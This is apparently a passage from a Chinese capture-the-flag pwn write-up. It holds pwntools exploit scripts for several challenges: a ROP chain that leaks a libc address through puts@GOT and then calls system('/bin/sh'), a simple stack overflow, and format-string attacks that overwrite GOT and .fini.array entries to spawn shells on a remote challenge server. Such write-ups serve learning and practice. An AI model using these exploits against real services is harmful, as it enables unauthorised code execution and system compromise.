
```
0x00007fffffffd940│+0x0000: 0x00000001f7dd7450     ← $rsp
0x00007fffffffd948│+0x0008: 0x00007fffffffd970  → 0x4141414141414141
0x00007fffffffd950│+0x0010: 0x4141414141414141
0x00007fffffffd958│+0x0018: 0x4141414141414141
0x00007fffffffd960│+0x0020: 0x4141414141414141     ← $rbp
0x00007fffffffd968│+0x0028: 0x000000000040089e  →  <__libc_csu_init+94> pop r13
0x00007fffffffd970│+0x0030: 0x4141414141414141     ← $rsi, $rdi
0x00007fffffffd978│+0x0038: 0x4141414141414141
0x00007fffffffd980│+0x0040: 0x4141414141414141
0x00007fffffffd988│+0x0048: 0x000000000040089e  →  <__libc_csu_init+94> pop r13
0x00007fffffffd990│+0x0050: 0x0000000000000001
0x00007fffffffd998│+0x0058: 0x0000000000000002
0x00007fffffffd9a0│+0x0060: 0x0000000000000003
0x00007fffffffd9a8│+0x0068: 0x00000000004008a3  →  <__libc_csu_init+99> pop rdi
0x00007fffffffd9b0│+0x0070: 0x0000000000601018  → 0x00000000004005a6  → 0xffe0e90000000068 ("h"?)
0x00007fffffffd9b8│+0x0078: 0x00000000004005a0  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a72] # 0x601018 <puts@got.plt>
0x00007fffffffd9c0│+0x0080: 0x00000000004007cd  →  <main+0> push rbp
```

exp如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher

se = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
rv = lambda : io.recv()
sconnect = lambda : io.interactive()

IS_LOCAL = 1
context.log_level = "DEBUG"
pwn_file = './welpwn'
elf = ELF(pwn_file)

if IS_LOCAL:
    io = process(pwn_file)
else:
    io = remote('111.200.241.244','59488')
#---------------------------------------------------------
#0x00000000004008a3 : pop rdi ; ret
#0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret
_3pop_ret = 0x000000000040089e
pop_rdi_ret = 0x00000000004008a3
main_addr = 0x4007CD
payload = 'A'*0x18+p64(_3pop_ret)+p64(1)+p64(2)+p64(3)+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main_addr)
#payload = 'A'*0x18+p64(pop_rdi_ret)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(main_addr)

if IS_LOCAL:
    gdb.attach(io,"break *0x400782\nc")
    pause()

sa("Welcome to RCTF\n",payload)
io.recvuntil('\x40')
puts_addr = u64(io.recvline()[:-1].ljust(8,'\x00'))

if IS_LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_base = puts_addr - libc.sym['puts']
    system_addr = libc_base + libc.sym['system']
    str_bin_sh = libc_base + next(libc.search('/bin/sh'))
else:
    libc=LibcSearcher('puts',puts_addr)
    libc_base = puts_addr - libc.dump('puts')
    system_addr = libc_base + libc.dump('system')
    str_bin_sh = libc_base + libc.dump('str_bin_sh')

log.info('puts_addr: 0x%x'%puts_addr)
log.info('system_addr: 0x%x'%system_addr)
log.info('str_bin_sh: 0x%x'%str_bin_sh)

payload2 = 'A'*0x18+p64(_3pop_ret)+p64(1)+p64(2)+p64(3)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)
if IS_LOCAL:
    sa("Welcome to RCTF\n",payload2)
else:
    se(payload2)
sconnect()
```

### 反应釜开关控制

简单题目：

```python
from pwn import *
from LibcSearcher import LibcSearcher

se = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
rv = lambda : io.recv()
sconnect = lambda : io.interactive()

IS_LOCAL = 0
context.log_level = "DEBUG"
pwn_file = './aaa'
elf = ELF(pwn_file)

if IS_LOCAL:
    io = process(pwn_file)
else:
    io = remote('111.200.241.244','58023')
#---------------------------------------------------------
payload = 'A'*0x208+p64(0x4005F6)
rv()
sl(payload)
sconnect()
```

### 实时数据监测

简单的字符串格式化漏洞，先gdb调试出`offset`是12，然后直接用工具自动生成`payload`：

```python
from pwn import *
from LibcSearcher import LibcSearcher

se = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x,y: io.sendafter(x,y)
rv = lambda : io.recv()
sconnect = lambda : io.interactive()

IS_LOCAL = 0
context.log_level = "DEBUG"
pwn_file = './data_monitor'
elf = ELF(pwn_file)

if IS_LOCAL:
    io = process(pwn_file)
else:
    io = remote('111.200.241.244','50322')
#---------------------------------------------------------
offest = 12
target_addr = 0x804A048
value = 0x2223322
payload = fmtstr_payload(offest,{target_addr:value})
'''
if IS_LOCAL:
    gdb.attach(io,"break *0x8048824\nc")
    pause()
'''
sl(payload)
sconnect()
```

### greeting-150

这个题目用到一个知识点`.fini.array`中的函数在`main`结束时被调用，所以需要修改其中的函数地址为`_start`，这样就可以完成攻击。攻击用到的`system@plt`和`_start`地址：

```
_start: 0x080484F0
system@plt: 0x08048490
```

由于`.fini.array`中原有的数据和`_start`高两位都一样，只需要修改后两位，就可以那么按照从小到大写入原则，按照如下顺序写入数据：

```
0x80F0   3
0x0804   1
0x8490   2
```

exp如下

```python
import sys
from pwn import *
from LibcSearcher import LibcSearcher

rv = lambda                      : io.recv()
rl = lambda a=False              : io.recvline(a)
ru = lambda a,b=True             : io.recvuntil(a,b)
rn = lambda x                    : io.recvn(x)
se = lambda x                    : io.send(x)
sl = lambda x                    : io.sendline(x)
sa = lambda a,b                  : io.sendafter(a,b)
sla = lambda a,b                 : io.sendlineafter(a,b)
sconnect = lambda                : io.interactive()

context.log_level = "DEBUG"
pwn_file = './greeting-150'
elf = ELF(pwn_file)

if len(sys.argv) < 2:
    IS_LOCAL = 1
    io = process(pwn_file)
else:
    IS_LOCAL = 0
    sys_argv = sys.argv[1].split(':')
    io = remote(sys_argv[0], int(sys_argv[1]))
#---------------------------------------------------------
fini_array_addr = 0x08049934
strlen_got_lo = elf.got['strlen']
strlen_got_hi = elf.got['strlen']+2
payload = 'aa'+p32(strlen_got_hi)+p32(strlen_got_lo)+p32(fini_array_addr)+"%2020c%12$hn"+"%31884c%13$hn"+"%96c%14$hn"

if IS_LOCAL:
    gdb.attach(io,"break *0x804864F\nc")
    pause()

rv()
sl(payload)
rv()
sl("/bin/sh")
sconnect()
```
